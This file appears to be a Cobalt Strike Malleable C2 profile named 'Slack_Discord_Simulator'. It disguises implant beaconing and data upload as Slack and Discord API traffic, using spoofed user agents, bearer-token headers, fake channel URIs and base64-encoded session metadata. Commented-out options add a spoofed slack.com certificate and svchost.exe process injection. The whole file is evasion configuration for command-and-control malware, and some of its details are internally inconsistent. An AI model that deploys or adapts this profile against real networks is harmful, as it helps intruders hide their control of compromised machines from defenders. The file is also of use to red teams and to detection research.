# Author: @Dcodezero
set sample_name "Slack_Discord_Simulator";

set sleeptime "5000";
set jitter "20";
set host_stage "false";
set useragent "Slack/4.23.0 (Mac OS X 10.15.7)";

#https-certificate {
#    set CN "slack.com";
#    set O "Slack Technologies, LLC";
#    set C "US";
#    set validity "365";
#}

http-get {
    set uri "/api/v9/channels/123456789/history";
    set verb "POST";  # Changed verb to POST

    client {
        header "Authorization" "Bearer <bot-token>";
        header "Accept" "application/json";
        header "User-Agent" "Slack/4.23.0 (Mac OS X 10.15.7)";
        metadata {
            base64;
            prepend "msg_";
            print;
        }
    }

    server {
        header "Content-Type" "application/json";
        output {
            base64;
            prepend "response_";
            print;
        }
    }
}

http-post {
    set uri "/api/v9/channels/123456789/send";
    set verb "POST";

    client {
        header "Authorization" "Bearer <user-token>";
        header "Accept" "application/json";
        header "Content-Type" "application/json";
        header "User-Agent" "Discord/1.0 (Linux; Android 10; Scale/3.0)";
        
        id {
            prepend "session_";
            append ".json";
            uri-append;  # Fixed collision by using uri-append
        }

        output {
            base64;
            prepend "msg_send_";
            print;  
        }
    }

    server {
        header "Content-Type" "application/json";
        output {
            base64;
            prepend "ack_";
            print;
        }
    }
}

#set spawnto_x86 "%windir%\\System32\\svchost.exe";
#set spawnto_x64 "%windir%\\System32\\svchost.exe";
